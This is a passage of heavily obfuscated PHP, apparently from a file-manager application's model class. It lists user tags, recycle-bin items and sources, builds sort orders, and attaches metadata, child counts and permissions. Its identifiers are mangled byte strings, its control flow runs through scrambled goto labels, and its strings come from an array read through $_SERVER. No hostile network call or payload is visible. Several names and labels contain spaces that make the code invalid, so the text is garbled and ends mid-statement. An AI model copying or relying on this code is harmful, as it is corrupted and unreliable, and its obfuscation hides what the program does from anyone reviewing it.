$c×œ—È¦êŸ = array_to_keyvalue($c×œ—È¦êŸ, $dÀ«›º»Š[33], $dÀ«›º»Š[75]); if ($c×œ—È¦êŸ) { $fœƒÍÜ²™´ = $this->listSource(array($dÀ«›º»Š[404] => array($dÀ«›º»Š[405], $c×œ—È¦êŸ))); } $fœƒÍÜ²™´ = array_to_keyvalue($fœƒÍÜ²™´[$dÀ«›º»Š[365]], $dÀ«›º»Š[390]); goto D–öŒÓ†˜È; A­§ÑÅš³Ü: } public function listUserTag($d›“ŸÍÀ˜) { goto Eî–ñ»‹±©; f ß°Ö®ˆ: if ($dÉñßï°†) { Model($eÎ‚äÌˆÁí[414])->removeBySource($dÉñßï°†); } return $D“å©µÂ; goto CÁâ½‡”œ‡; c§Òø¶ïø: if (!$D“å©µÂ || count($aê¨ËßÖÌ³) == $D“å©µÂ[$eÎ‚äÌˆÁí[362]][$eÎ‚äÌˆÁí[363]]) { return $D“å©µÂ; } $dÉñßï°† = array(); $AÕéğ­ğêõ = array_to_keyvalue($D“å©µÂ[$eÎ‚äÌˆÁí[74]], $eÎ‚äÌˆÁí[33], $eÎ‚äÌˆÁí[390]); goto D”‘½Ÿ¶òˆ; BÛ«ËÏ²šÉ: foreach ($a§‘…ïÇÃ as $d»Ó “Çô° => $fˆ²ãé’¥) { $DÙËîæŸâµ = !0; if (!$d›“ŸÍÀ˜) { $aê¨ËßÖÌ³[] = $d»Ó “Çô°; continue; } foreach ($d›“ŸÍÀ˜ as $CÔ¼ù»Ó‚) { if (!in_array($CÔ¼ù»Ó‚, $fˆ²ãé’¥)) { $DÙËîæŸâµ = !1; break; } } if ($DÙËîæŸâµ) { $aê¨ËßÖÌ³[] = $d»Ó “Çô°; } } if (!$aê¨ËßÖÌ³) { return array(); } $D“å©µÂ = $this->listSource(array($eÎ‚äÌˆÁí[404] => array($eÎ‚äÌˆÁí[405], $aê¨ËßÖÌ³))); goto c§Òø¶ïø; D”‘½Ÿ¶òˆ: $D‹‘‚‰‡Å¼ = array_to_keyvalue($D“å©µÂ[$eÎ‚äÌˆÁí[73]], $eÎ‚äÌˆÁí[33], $eÎ‚äÌˆÁí[390]); $cÏâ¸êÛñõ = array_merge($D‹‘‚‰‡Å¼, $AÕéğ­ğêõ); foreach ($aê¨ËßÖÌ³ as $FÚİ—’½ìò) { if (!in_array($FÚİ—’½ìò, $cÏâ¸êÛñõ)) { $dÉñßï°†[] = $FÚİ—’½ìò; } } goto f ß°Ö®ˆ; AÁİßõ“ä: $a§‘…ïÇÃ = array(); foreach ($f­¢ğ££Á¹ as $BçÛŠ¿êî) { $FÚİ—’½ìò = $BçÛŠ¿êî[$eÎ‚äÌˆÁí[75]]; if (!$FÚİ—’½ìò) { continue; } if (!isset($a§‘…ïÇÃ[$FÚİ—’½ìò])) { $a§‘…ïÇÃ[$FÚİ—’½ìò] = array(); } $a§‘…ïÇÃ[$FÚİ—’½ìò][] = $BçÛŠ¿êî[$eÎ‚äÌˆÁí[413]]; } $aê¨ËßÖÌ³ = array(); goto BÛ«ËÏ²šÉ; Eî–ñ»‹±©: $eÎ‚äÌˆÁí =& $_SERVER[Š‰]; if ($d›“ŸÍÀ˜ && !is_array($d›“ŸÍÀ˜)) { $d›“ŸÍÀ˜ = array($d›“ŸÍÀ˜); } $f­¢ğ££Á¹ = Model($eÎ‚äÌˆÁí[412])->listData(); goto AÁİßõ“ä; CÁâ½‡”œ‡: } public function listUserRecycle() { $d˜ğĞƒ‚² =& $_SERVER[Š‰]; $DÍ¡‚ãÄ¨ = Model($d˜ğĞƒ‚²[415])->listData(); if (!$DÍ¡‚ãÄ¨) { return array(); } $bÉš“Éàµ² = array($d˜ğĞƒ‚²[404] => array($d˜ğĞƒ‚²[405], $DÍ¡‚ãÄ¨), $d˜ğĞƒ‚²[416] => 1); return $this->listSource($bÉš“Éàµ²); } public function listSource($Bƒö¼äÃ™š, $f§Æ¬‰Ä¨Ÿ = 3000) { goto c”¡­‘ÄÇè; c›Œ§ÜØæ: $FãµÓÍ‹¿ = $this->field($d‰”ƒ½©™¯)->_makeOrder()->where($Bƒö¼äÃ™š)->selectPage($f§Æ¬‰Ä¨Ÿ); $this->_listDataApply($FãµÓÍ‹¿[$eÅÔğáÍÖ[365]]); $this->_listMake($FãµÓÍ‹¿); goto c°•æ±ÈáÍ; c”¡­‘ÄÇè: $eÅÔğáÍÖ =& $_SERVER[Š‰]; if (!isset($Bƒö¼äÃ™š[$eÅÔğáÍÖ[417]])) { $Bƒö¼äÃ™š[$eÅÔğáÍÖ[417]] = 0; } $d‰”ƒ½©™¯ = $eÅÔğáÍÖ[418]; goto c›Œ§ÜØæ; c°•æ±ÈáÍ: return $FãµÓÍ‹¿; goto BÂñó¹ù¯¿; BÂñó¹ù¯¿: } protected function _makeOrder() { goto BÕ÷ÍŸ¯Í; d¿£»ÁÈÄ»: $dªôÜ§Ø™Ò = Input::get($EŞ¾ƒöâÁ¬[430], $EŞ¾ƒöâÁ¬[7], $BËÆò‡éÒå, array_keys($dÄÓŒã“çò)); if (!in_array($Aª³çÉÆÉÛ, array_keys($eõÃ’‡’ãÊ))) { $Aª³çÉÆÉÛ = $EŞ¾ƒöâÁ¬[28]; } if (!in_array($dªôÜ§Ø™Ò, array_keys($dÄÓŒã“çò))) { $Aª³çÉÆÉÛ = $EŞ¾ƒöâÁ¬[422]; } goto BÀäïğÂãè; BÕ÷ÍŸ¯Í: $EŞ¾ƒöâÁ¬ =& $_SERVER[Š‰]; $A©ã²¡÷½İ = Model($EŞ¾ƒöâÁ¬[419])->get($EŞ¾ƒöâÁ¬[420]); $BËÆò‡éÒå = Model($EŞ¾ƒöâÁ¬[419])->get($EŞ¾ƒöâÁ¬[421]); goto EÄŞ©Ãè; EÄŞ©Ãè: $dÄÓŒã“çò = array($EŞ¾ƒöâÁ¬[422] => $EŞ¾ƒöâÁ¬[423], $EŞ¾ƒöâÁ¬[424] => $EŞ¾ƒöâÁ¬[425]); $eõÃ’‡’ãÊ = array($EŞ¾ƒöâÁ¬[28] => $EŞ¾ƒöâÁ¬[28], $EŞ¾ƒöâÁ¬[77] => $EŞ¾ƒöâÁ¬[77], $EŞ¾ƒöâÁ¬[167] => $EŞ¾ƒöâÁ¬[399], $EŞ¾ƒöâÁ¬[426] => $EŞ¾ƒöâÁ¬[426], $EŞ¾ƒöâÁ¬[427] => $EŞ¾ƒöâÁ¬[428], $EŞ¾ƒöâÁ¬[192] => $EŞ¾ƒöâÁ¬[192], $EŞ¾ƒöâÁ¬[83] => $EŞ¾ƒöâÁ¬[83]); $Aª³çÉÆÉÛ = Input::get($EŞ¾ƒöâÁ¬[429], $EŞ¾ƒöâÁ¬[7], $A©ã²¡÷½İ, array_keys($eõÃ’‡’ãÊ)); goto d¿£»ÁÈÄ»; BÀäïğÂãè: if ($Aª³çÉÆÉÛ == $EŞ¾ƒöâÁ¬[28]) { } $b‰½¯¯Öç = $EŞ¾ƒöâÁ¬[431] . $eõÃ’‡’ãÊ[$Aª³çÉÆÉÛ] . $EŞ¾ƒöâÁ¬[50] . $dÄÓŒã“çò[$dªôÜ§Ø™Ò]; return $this->order(rtrim(trim($b‰½¯¯Öç), $EŞ¾ƒöâÁ¬[47])); goto c¢ôÇòš ò; c¢ôÇòš ò: } protected function _listDataApplyItem($a¥ê¶Ü‰Æ¡, $A·Í­¬´á = false) { $bÂ»Óå¿“ = array($a¥ê¶Ü‰Æ¡); $this->_listDataApply($bÂ»Óå¿“, $A·Í­¬´á); return $bÂ»Óå¿“[0]; } protected function _listDataApply(&$aÏ·ƒù…æ£, $D²İ¦¼à‚· = false) { goto BÔ±¾çŸ÷Ù; BÔ±¾çŸ÷Ù: $f±ÚøàîÔ¹ =& $_SERVER[Š‰]; if (!$aÏ·ƒù…æ£) { $aÏ·ƒù…æ£ = array(); return; } $f‰¿Æ×¥Å = array_to_keyvalue($aÏ·ƒù…æ£, $f±ÚøàîÔ¹[33], $f±ÚøàîÔ¹[390]); goto Fç•¹İÆÅí; Fç•¹İÆÅí: $f‰¿Æ×¥Å = array_unique($f‰¿Æ×¥Å); $this->_listSourceCache($aÏ·ƒù…æ£); if (!$D²İ¦¼à‚·) { $this->_listAppendMeta($aÏ·ƒù…æ£, $f‰¿Æ×¥Å); $this->_listAppendFileMeta($aÏ·ƒù…æ£, $f‰¿Æ×¥Å); $this->_listAppendChildren($aÏ·ƒù…æ£, $f‰¿Æ×¥Å); } goto dËéàæœŠ; D¿åçå¯¦—: $this->_listAppendUser($aÏ·ƒù…æ£); $this->_listFilterInfo($aÏ·ƒù…æ£, $D²İ¦¼à‚·); goto aÚŞİÔª‚õ; dËéàæœŠ: $this->_listAppendPath($aÏ·ƒù…æ£); $this->_listAppendAuth($aÏ·ƒù…æ£); $this->_listAppendSourceInfo($aÏ·ƒù…æ£, $f‰¿Æ×¥Å); goto D¿åçå¯¦—; aÚŞİÔª‚õ: } protected function _listSourceCache($dñŒ°ØíÁÕ) { $F˜ººˆ“Ó† =& $_SERVER[Š‰]; foreach ($dñŒ°ØíÁÕ as $Eäƒ„©‰Úœ) { self::$cacheSourceInfo[$F˜ººˆ“Ó†[432] . $Eäƒ„©‰Úœ[$F˜ººˆ“Ó†[390]]] = $Eäƒ„©‰Úœ; } } protected function _listFilterInfo(&$Bø†§ªÕ, $F­òöƒÜ¨ë = false) { $fë©ÄÙĞˆŒ =& $_SERVER[Š‰]; foreach ($Bø†§ªÕ as &$c×ä¥¾×ĞŸ) { $c×ä¥¾×ĞŸ = $this->pathInfoFilter($c×ä¥¾×ĞŸ); self::$cachePathInfo[$fë©ÄÙĞˆŒ[433] . intval($F­òöƒÜ¨ë) . $fë©ÄÙĞˆŒ[434] . $c×ä¥¾×ĞŸ[$fë©ÄÙĞˆŒ[390]]] = $c×ä¥¾×ĞŸ; } unset($c×ä¥¾×ĞŸ); } protected function _listMake(&$bé¯ÊÈÊ„) { $cİÏ÷¦¥ù =& $_SERVER[Š‰]; $bé¯ÊÈÊ„[$cİÏ÷¦¥ù[74]] = array(); $bé¯ÊÈÊ„[$cİÏ÷¦¥ù[73]] = array(); foreach ($bé¯ÊÈÊ„[$cİÏ÷¦¥ù[365]] as $AÕö‡·µ) { $AŒöÉâ«æŒ = $AÕö‡·µ[$cİÏ÷¦¥ù[397]] == 1 ? $cİÏ÷¦¥ù[74] : $cİÏ÷¦¥ù[73]; $bé¯ÊÈÊ„[$AŒöÉâ«æŒ][] = $AÕö‡·µ; } unset($bé¯ÊÈÊ„[$cİÏ÷¦¥ù[365]]); } protected function _listAppendMeta(&$C¥ÁğˆôÑ†, $Cïë†ğó÷) { goto AĞ±½ÍÅÅ¥; AĞ±½ÍÅÅ¥: $E˜†‡ÁñÏ¨ =& $_SERVER[Š‰]; $C•ø“éÅ£ = array($E˜†‡ÁñÏ¨[404] => array($E˜†‡ÁñÏ¨[405], $Cïë†ğó÷)); $cá²²Ç³¶° = Model($E˜†‡ÁñÏ¨[435])->field($E˜†‡ÁñÏ¨[436])->where($C•ø“éÅ£)->select(); goto DšÑ ·‹ô; DšÑ ·‹ô: if (!$cá²²Ç³¶°) { return; } $e–ˆƒàËè = array($E˜†‡ÁñÏ¨[437], $E˜†‡ÁñÏ¨[438]); $C†ŒÃ‡‰Ñí = array(); goto f«ÊğğÎ¾; f«ÊğğÎ¾: foreach ($cá²²Ç³¶° as $F‡ˆÒĞ°â) { if (!isset($C†ŒÃ‡‰Ñí[$F‡ˆÒĞ°â[$E˜†‡ÁñÏ¨[390]]])) { $C†ŒÃ‡‰Ñí[$F‡ˆÒĞ°â[$E˜†‡ÁñÏ¨[390]]] = array(); } if (in_array($F‡ˆÒĞ°â[$E˜†‡ÁñÏ¨[92]], $e–ˆƒàËè)) { continue; } $C†ŒÃ‡‰Ñí[$F‡ˆÒĞ°â[$E˜†‡ÁñÏ¨[390]]][$F‡ˆÒĞ°â[$E˜†‡ÁñÏ¨[92]]] = $F‡ˆÒĞ°â[$E˜†‡ÁñÏ¨[370]]; } foreach ($C¥ÁğˆôÑ† as &$cƒ‹ä÷‹Ø§) { $cƒ‹ä÷‹Ø§[$E˜†‡ÁñÏ¨[439]] = !1; if (isset($C†ŒÃ‡‰Ñí[$cƒ‹ä÷‹Ø§[$E˜†‡ÁñÏ¨[390]]])) { $cƒ‹ä÷‹Ø§[$E˜†‡ÁñÏ¨[439]] = $C†ŒÃ‡‰Ñí[$cƒ‹ä÷‹Ø§[$E˜†‡ÁñÏ¨[390]]]; } if ($this->fileIsLock($cƒ‹ä÷‹Ø§) && $cƒ‹ä÷‹Ø§[$E˜†‡ÁñÏ¨[400]]) { $e‚Ö«èÉò = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $cƒ‹ä÷‹Ø§[$E˜†‡ÁñÏ¨[400]][$E˜†‡ÁñÏ¨[401]] = AuthModel::authDisable($cƒ‹ä÷‹Ø§[$E˜†‡ÁñÏ¨[400]][$E˜†‡ÁñÏ¨[401]], $e‚Ö«èÉò); $cƒ‹ä÷‹Ø§[$E˜†‡ÁñÏ¨[400]][$E˜†‡ÁñÏ¨[440]][$E˜†‡ÁñÏ¨[400]] = $cƒ‹ä÷‹Ø§[$E˜†‡ÁñÏ¨[400]][$E˜†‡ÁñÏ¨[401]]; } } unset($cƒ‹ä÷‹Ø§); goto FœÜ¥Î…åî; FœÜ¥Î…åî: } protected function _listAppendFileMeta(&$cÚëšÃïÖ, $c˜ÊÅÓÓÇØ) { goto fÏæ ·†®; fÏæ ·†®: $B¦›Ğ§İÜÉ =& $_SERVER[Š‰]; $b¥Å¬ˆØ˜ = array_to_keyvalue($cÚëšÃïÖ, $B¦›Ğ§İÜÉ[33], $B¦›Ğ§İÜÉ[441]); $b¥Å¬ˆØ˜ = array_filter(array_unique($b¥Å¬ˆØ˜)); goto c²Î¹‘ëÖ; c²Î¹‘ëÖ: if (!$b¥Å¬ˆØ˜) { return; } $FÔİ›¡ã‘© = array($B¦›Ğ§İÜÉ[442] => array($B¦›Ğ§İÜÉ[405], $b¥Å¬ˆØ˜)); $bÜï’¬“ï˜ = $B¦›Ğ§İÜÉ[443]; goto EˆáçÔç; EˆáçÔç: $bÚœ¥ÀË“Ï = Model($B¦›Ğ§İÜÉ[444])->field($bÜï’¬“ï˜)->where($FÔİ›¡ã‘©)->select(); $bÚœ¥ÀË“Ï = array_to_keyvalue($bÚœ¥ÀË“Ï, $B¦›Ğ§İÜÉ[441]); $E‡Ã®Ÿ‰ë± = Model($B¦›Ğ§İÜÉ[445])->field($B¦›Ğ§İÜÉ[446])->where($FÔİ›¡ã‘©)->select(); goto B¶ø³ÄØË; B¶ø³ÄØË: $E‡Ã®Ÿ‰ë± = $E‡Ã®Ÿ‰ë± ? $E‡Ã®Ÿ‰ë± : array(); $bôÒêó¡İõ = array(); foreach ($E‡Ã®Ÿ‰ë± as $d¹©çº¨½) { if (!isset($bôÒêó¡İõ[$d¹©çº¨½[$B¦›Ğ§İÜÉ[441]]])) { $bôÒêó¡İõ[$d¹©çº¨½[$B¦›Ğ§İÜÉ[441]]] = array(); } $bôÒêó¡İõ[$d¹©çº¨½[$B¦›Ğ§İÜÉ[441]]][$d¹©çº¨½[$B¦›Ğ§İÜÉ[92]]] = $d¹©çº¨½[$B¦›Ğ§İÜÉ[370]]; } goto CìéâÄ†Ö»; CìéâÄ†Ö»: foreach ($cÚëšÃïÖ as &$C‡¹¥à†®À) { goto Bí²¸Š÷„; aˆ†Ó²Ëç: $B‚ÏÏ‡„é¼[$B¦›Ğ§İÜÉ[77]] = $C‡¹¥à†®À[$B¦›Ğ§İÜÉ[77]]; $B‚ÏÏ‡„é¼[$B¦›Ğ§İÜÉ[28]] = $C‡¹¥à†®À[$B¦›Ğ§İÜÉ[28]]; if (!isset(self::$cacheFileInfo[$B¦›Ğ§İÜÉ[447] . $c´ßê„õö])) { self::$cacheFileInfo[$B¦›Ğ§İÜÉ[447] . $c´ßê„õö] = array_merge(array(), $B‚ÏÏ‡„é¼); } goto DÅ“Ñ‹ÊÄ­; Bí²¸Š÷„: $c´ßê„õö = $C‡¹¥à†®À[$B¦›Ğ§İÜÉ[441]]; if (!$c´ßê„õö || !isset($bÚœ¥ÀË“Ï[$c´ßê„õö])) { continue; } $B‚ÏÏ‡„é¼ = $bÚœ¥ÀË“Ï[$c´ßê„õö]; goto aˆ†Ó²Ëç; DÅ“Ñ‹ÊÄ­: unset($bÚœ¥ÀË“Ï[$c´ßê„õö][$B¦›Ğ§İÜÉ[75]]); $eßğ¡İĞî = is_array($bôÒêó¡İõ[$c´ßê„õö]) ? $bôÒêó¡İõ[$c´ßê„õö] : array(); $C‡¹¥à†®À[$B¦›Ğ§İÜÉ[163]] = array_merge($eßğ¡İĞî, $bÚœ¥ÀË“Ï[$c´ßê„õö]); goto fƒ†ëÊºÆâ; fƒ†ëÊºÆâ: if (isset($C‡¹¥à†®À[$B¦›Ğ§İÜÉ[163]][$B¦›Ğ§İÜÉ[162]])) { $C‡¹¥à†®À[$B¦›Ğ§İÜÉ[162]] = json_decode($C‡¹¥à†®À[$B¦›Ğ§İÜÉ[163]][$B¦›Ğ§İÜÉ[162]], !0); unset($C‡¹¥à†®À[$B¦›Ğ§İÜÉ[163]][$B¦›Ğ§İÜÉ[162]]); } goto Eä‰šóÂ‡„; Eä‰šóÂ‡„: } unset($C‡¹¥à†®À); goto fğÛ÷·Ê; fğÛ÷·Ê: } protected function _listAppendSourceInfo(&$f¸ÌëÌ’¸‰, $B°Š¿œÃ±Ä) { goto f®Áì‹Ü ; Aç“ØòŞ•Ñ: $CÆ°“ñç™î = array_to_keyvalue_group($f‡³ –“Âğ, $F»ÒÎƒ„ï¨[390]); foreach ($f¸ÌëÌ’¸‰ as &$Aôæ²óŞ”ª) { $Aôæ²óŞ”ª[$F»ÒÎƒ„ï¨[84]] = array($F»ÒÎƒ„ï¨[451] => 0, $F»ÒÎƒ„ï¨[452] => 0, $F»ÒÎƒ„ï¨[453] => 0); if (isset($aÜ×©Ì¹›[$Aôæ²óŞ”ª[$F»ÒÎƒ„ï¨[390]]])) { $Aôæ²óŞ”ª[$F»ÒÎƒ„ï¨[84]][$F»ÒÎƒ„ï¨[454]] = 1; $Aôæ²óŞ”ª[$F»ÒÎƒ„ï¨[84]][$F»ÒÎƒ„ï¨[455]] = $aÜ×©Ì¹›[$Aôæ²óŞ”ª[$F»ÒÎƒ„ï¨[390]]][$F»ÒÎƒ„ï¨[28]]; } if (isset($b®ÚŠÅËİ¢[$Aôæ²óŞ”ª[$F»ÒÎƒ„ï¨[390]]])) { $Aôæ²óŞ”ª[$F»ÒÎƒ„ï¨[84]][$F»ÒÎƒ„ï¨[456]] = array(); foreach ($b®ÚŠÅËİ¢[$Aôæ²óŞ”ª[$F»ÒÎƒ„ï¨[390]]] as $fˆó–£ ¬“) { $AŞôÉº“™ = $eÚ©Á°¿Â[$fˆó–£ ¬“]; $Aôæ²óŞ”ª[$F»ÒÎƒ„ï¨[84]][$F»ÒÎƒ„ï¨[456]][] = array($F»ÒÎƒ„ï¨[457] => $AŞôÉº“™[$F»ÒÎƒ„ï¨[388]], $F»ÒÎƒ„ï¨[407] => $AŞôÉº“™[$F»ÒÎƒ„ï¨[28]], $F»ÒÎƒ„ï¨[458] => $AŞôÉº“™[$F»ÒÎƒ„ï¨[459]]); } } if (isset($CÆ°“ñç™î[$Aôæ²óŞ”ª[$F»ÒÎƒ„ï¨[390]]])) { $Aôæ²óŞ”ª[$F»ÒÎƒ„ï¨[84]][$F»ÒÎƒ„ï¨[460]] = array(); foreach ($CÆ°“ñç™î[$Aôæ²óŞ”ª[$F»ÒÎƒ„ï¨[390]]] as $B —»Œé…×) { $Aôæ²óŞ”ª[$F»ÒÎƒ„ï¨[84]][$F»ÒÎƒ„ï¨[460]] = array($F»ÒÎƒ„ï¨[461] => $B —»Œé…×[$F»ÒÎƒ„ï¨[462]], $F»ÒÎƒ„ï¨[463] => $B —»Œé…×[$F»ÒÎƒ„ï¨[464]], $F»ÒÎƒ„ï¨[465] => $B —»Œé…×[$F»ÒÎƒ„ï¨[390]], $F»ÒÎƒ„ï¨[466] => $B —»Œé…×[$F»ÒÎƒ„ï¨[467]], $F»ÒÎƒ„ï¨[468] => $B —»Œé…×[$F»ÒÎƒ„ï¨[469]], $F»ÒÎƒ„ï¨[470] => $B —»Œé…×[$F»ÒÎƒ„ï¨[470]], $F»ÒÎƒ„ï¨[471] => $B —»Œé…×[$F»ÒÎƒ„ï¨[471]]); } } } unset($Aôæ²óŞ”ª); goto Cæ¨¬´­’Ç; D´µ®ñÇ›½: $BŞšÊö´•ê = Model($F»ÒÎƒ„ï¨[412])->listData(); $CÄô“³Úì = Model($F»ÒÎƒ„ï¨[402])->listData(); $f‡³ –“Âğ = Model($F»ÒÎƒ„ï¨[450])->listSimple(); goto F„Ù„£¤‚ï; Cæ¨¬´­’Ç: return $f¸ÌëÌ’¸‰; goto eáŞÔİ¯; F„Ù„£¤‚ï: $eÚ©Á°¿Â = array_to_keyvalue($aß¹Ù¼”, $F»ÒÎƒ„ï¨[388]); $b®ÚŠÅËİ¢ = array_to_keyvalue_group($BŞšÊö´•ê, $F»ÒÎƒ„ï¨[75], $F»ÒÎƒ„ï¨[413]); $aÜ×©Ì¹› = array_to_keyvalue($CÄô“³Úì, $F»ÒÎƒ„ï¨[75]); goto Aç“ØòŞ•Ñ; f®Áì‹Ü : $F»ÒÎƒ„ï¨ =& $_SERVER[Š‰]; if (!defined($F»ÒÎƒ„ï¨[448])) { return; } $aß¹Ù¼” = Model($F»ÒÎƒ„ï¨[449])->listData(); goto D´µ®ñÇ›½; eáŞÔİ¯: } protected function _listAppendChildren(&$cÙ¼ëö£Ó‚, $Bø°¬£®ƒ) { goto aƒõóêö®Ô; FĞùØ£†È«: unset($b™ï½éÅõ); goto E´¿Õé½´; F†§“‚»µä: foreach ($cÙ¼ëö£Ó‚ as &$b™ï½éÅõ) { if (!$b™ï½éÅõ[$d¨ƒŞğã[397]]) { continue; } $cöæäÖ¥¼å[] = $b™ï½éÅõ[$d¨ƒŞğã[390]]; } unset($b™ï½éÅõ); if (!$cöæäÖ¥¼å) { return; } goto bÅµçöÚ•; bá™¯„»¹º: $F”£õ‡‘‹ = array(); foreach ($FĞºÒïô² as $B¥ªœ˜Ç¾Ş) { $E¢äøÜÆ»Û = $B¥ªœ˜Ç¾Ş[$d¨ƒŞğã[472]]; $e„‹Ì™ÀæŠ = $B¥ªœ˜Ç¾Ş[$d¨ƒŞğã[397]] == $d¨ƒŞğã[86] ? $d¨ƒŞğã[202] : $d¨ƒŞğã[201]; if (!isset($F”£õ‡‘‹[$E¢äøÜÆ»Û])) { $F”£õ‡‘‹[$E¢äøÜÆ»Û] = array($d¨ƒŞğã[201] => 0, $d¨ƒŞğã[202] => 0); } $F”£õ‡‘‹[$E¢äøÜÆ»Û][$e„‹Ì™ÀæŠ] += $B¥ªœ˜Ç¾Ş[$d¨ƒŞğã[474]]; } foreach ($cÙ¼ëö£Ó‚ as &$b™ï½éÅõ) { if (!$b™ï½éÅõ[$d¨ƒŞğã[397]]) { continue; } $B“ÆÍ õøä = is_array($F”£õ‡‘‹[$b™ï½éÅõ[$d¨ƒŞğã[390]]]) ? $F”£õ‡‘‹[$b™ï½éÅõ[$d¨ƒŞğã[390]]] : $få§Ç”·; $b™ï½éÅõ[$d¨ƒŞğã[202]] = $B“ÆÍ õøä[$d¨ƒŞğã[202]]; $b™ï½éÅõ[$d¨ƒŞğã[201]] = $B“ÆÍ õøä[$d¨ƒŞğã[201]]; unset($b™ï½éÅõ[$d¨ƒŞğã[399]]); } goto FĞùØ£†È«; aƒõóêö®Ô: $d¨ƒŞğã =& $_SERVER[Š‰]; $cöæäÖ¥¼å = array(); $få§Ç”· = array($d¨ƒŞğã[201] => 0, $d¨ƒŞğã[202] => 0); goto F†§“‚»µä; bÅµçöÚ•: $B²£ñ“™º½ = array($d¨ƒŞğã[472] => array($d¨ƒŞğã[7], $cöæäÖ¥¼å)); $d‘ÄòÜ½İŞ = array($d¨ƒŞğã[472], $d¨ƒŞğã[397], $d¨ƒŞğã[473] => $d¨ƒŞğã[474]); $FĞºÒïô² = $this->field($d‘ÄòÜ½İŞ)->where($B²£ñ“™º½)->group($d¨ƒŞğã[475])->select(); goto bá™¯„»¹º; E´¿Õé½´: } protected function _listAppendAuth(&$AÌî®Áèè³) { goto C—Ü‡ƒê…Ş; e¡‘×éÎ¨: foreach ($AÌî®Áèè³ as $b¾É¯˜ùİ) { if ($b¾É¯˜ùİ[$bÚä–¤İê[398]] == self::TYPE_GROUP) { $dÓ–ìô÷Ô¾[] = $b¾É¯˜ùİ[$bÚä–¤İê[390]]; } } if (!$dÓ–ìô÷Ô¾) { return; } $BïÆÜñİê = array_to_keyvalue($AÌî®Áèè³, $bÚä–¤İê[390]); goto AáÉŠ¢ÏßÉ; AáÉŠ¢ÏßÉ: $C‰´¢ÎÌÖ¤ = Model($bÚä–¤İê[476])->getSourceList($dÓ–ìô÷Ô¾, $BïÆÜñİê); foreach ($AÌî®Áèè³ as $aÔˆš™î—á => &$b¾É¯˜ùİ) { $b¾É¯˜ùİ[$bÚä–¤İê[400]] = $C‰´¢ÎÌÖ¤[$b¾É¯˜ùİ[$bÚä–¤İê[390]]]; if (!$b¾É¯˜ùİ[$bÚä–¤İê[400]] && $b¾É¯˜ùİ[$bÚä–¤İê[398]] == self::TYPE_GROUP) { $b¾É¯˜ùİ[$bÚä–¤İê[400]] = Action($bÚä–¤İê[477])->pathGroupAuthMake($b¾É¯˜ùİ[$bÚä–¤İê[478]]); if (!$b¾É¯˜ùİ[$bÚä–¤İê[400]] && !_get($GLOBALS, $bÚä–¤İê[479])) { $b¾É¯˜ùİ[$bÚä–¤İê[194]] = !1; $b¾É¯˜ùİ[$bÚä–¤İê[193]] = !1; } } if ($b¾É¯˜ùİ[$bÚä–¤İê[400]]) { $b¾É¯˜ùİ[$bÚä–¤İê[194]] = AuthModel::authCheckEdit($b¾É¯˜ùİ[$bÚä–¤İê[400]][$bÚä–¤İê[401]]); $b¾É¯˜ùİ[$bÚä–¤İê[193]] = AuthModel::authCheckView($b¾É¯˜ùİ[$bÚä–¤İê[400]][$bÚä–¤İê[401]]); } $this->groupPathDisplay($b¾É¯˜ùİ); } unset($b¾É¯˜ùİ); goto eÑ¬ËÈ¥è•; C—Ü‡ƒê…Ş: $bÚä–¤İê =& $_SERVER[Š‰]; if (!defined($bÚä–¤İê[448])) { return; } $dÓ–ìô÷Ô¾ = array(); goto e¡‘×éÎ¨; eÑ¬ËÈ¥è•: } public function groupPathDisplay(&$dÔ¦µ¨×) { goto A¥²”ŒÃ»; A¥²”ŒÃ»: $c¤Ô•ƒğÄ =& $_SERVER[Š‰]; if ($dÔ¦µ¨×[$c¤Ô•ƒğÄ[398]] != self::TYPE_GROUP) { return; } $aµˆ•÷ãÒ = Model($c¤Ô•ƒğÄ[480])->getInfo($dÔ¦µ¨×[$c¤Ô•ƒğÄ[478]]); goto bÁíğÒ‰“Ğ; e¬Ëà¹ñ„: $dÔ¦µ¨×[$c¤Ô•ƒğÄ[482]] = $aµˆ•÷ãÒ[$c¤Ô•ƒğÄ[472]]; $dÔ¦µ¨×[$c¤Ô•ƒğÄ[483]] = $aµˆ•÷ãÒ[$c¤Ô•ƒğÄ[481]]; $dÔ¦µ¨×[$c¤Ô•ƒğÄ[484]] = $aµˆ•÷ãÒ[$c¤Ô•ƒğÄ[485]]; goto fŒ¹ß‘•Šù; fŒ¹ß‘•Šù: $dÔ¦µ¨×[$c¤Ô•ƒğÄ[486]] = $fÄç™ù¬¾ï . $aµˆ•÷ãÒ[$c¤Ô•ƒğÄ[84]][$c¤Ô•ƒğÄ[390]]; goto F„İ›¢•„ƒ; bÁíğÒ‰“Ğ: $bÊ´·¦İç = $this->parentLevelArray($aµˆ•÷ãÒ[$c¤Ô•ƒğÄ[481]]); $fÄç™ù¬¾ï = $c¤Ô•ƒğÄ[33]; foreach ($bÊ´·¦İç as $B‹…ï²è«‚) { $B³†¬Ï’Ø = Model($c¤Ô•ƒğÄ[480])->getInfo($B‹…ï²è«‚); $fÄç™ù¬¾ï .= $B³†¬Ï’Ø[$c¤Ô•ƒğÄ[84]][$c¤Ô•ƒğÄ[390]] . $c¤Ô•ƒğÄ[47]; } goto e¬Ëà¹ñ„; F„İ›¢•„ƒ: } protected function _listAppendPath(&$e£ºö£ ¬) { goto fÄÙ…¤š™; EÉæÒ£»Á: $aˆ¶½‘â¦´ = array(); $dƒ¿ÚôÀÙ¼ = array(); foreach ($e£ºö£ ¬ as &$f±“ é ˆË) { goto A²§÷İ­; A²§÷İ­: $AÈÀâ‹ÙáÁ = $f±“ é ˆË[$FêòÆö³¨[481]]; if (isset($dƒ¿ÚôÀÙ¼[$AÈÀâ‹ÙáÁ])) { $a¨öùô®¾Ú = $aˆ¶½‘â¦´[$AÈÀâ‹ÙáÁ]; } else { $DÍƒŒ­İŠ· = $this->parentLevelArray($f±“ é ˆË[$FêòÆö³¨[481]]); $DìŸ¶ËÙ»Â = $FêòÆö³¨[488] . $f±“ é ˆË[$FêòÆö³¨[398]] . $FêòÆö³¨[434] . $f±“ é ˆË[$FêòÆö³¨[478]]; if ($aˆ¶½‘â¦´[$DìŸ¶ËÙ»Â]) { $a¨öùô®¾Ú = $aˆ¶½‘â¦´[$DìŸ¶ËÙ»Â]; } else { $a¨öùô®¾Ú = $this->_listAppendPathRoot($f±“ é ˆË, $DÍƒŒ­İŠ·); $aˆ¶½‘â¦´[$DìŸ¶ËÙ»Â] = $a¨öùô®¾Ú; } foreach ($DÍƒŒ­İŠ· as $ağß²öäÊÒ => $D°Î‡ã·£) { if 